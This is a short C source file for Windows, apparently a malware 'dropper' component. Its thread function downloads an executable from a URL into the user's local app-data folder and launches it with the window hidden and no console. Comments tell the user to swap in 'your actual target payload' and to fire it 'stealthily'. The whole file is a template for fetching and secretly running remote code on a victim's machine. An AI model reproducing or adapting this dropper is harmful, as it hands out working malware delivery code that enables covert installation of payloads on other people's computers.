#include "dropper.h"
#include <windows.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

// The isolated background thread functionality
DWORD WINAPI DropperThread(LPVOID lpParam) {
    char szDestPath[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\putty.exe", szDestPath, MAX_PATH);

    // Swap URL to your actual target payload
    const char* szUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe";
    
    HRESULT dl = URLDownloadToFileA(NULL, szUrl, szDestPath, 0, NULL);
    
    // Fire the payload stealthily
    if (dl == S_OK) {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi = { 0 };

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(
            szDestPath,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW, // Guaranteed console supression
            NULL,
            NULL,
            &si,
            &pi
        )) {
            // Close process handles right away leaving the app alive independently
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 1;
        }
    }
    return 0;
}
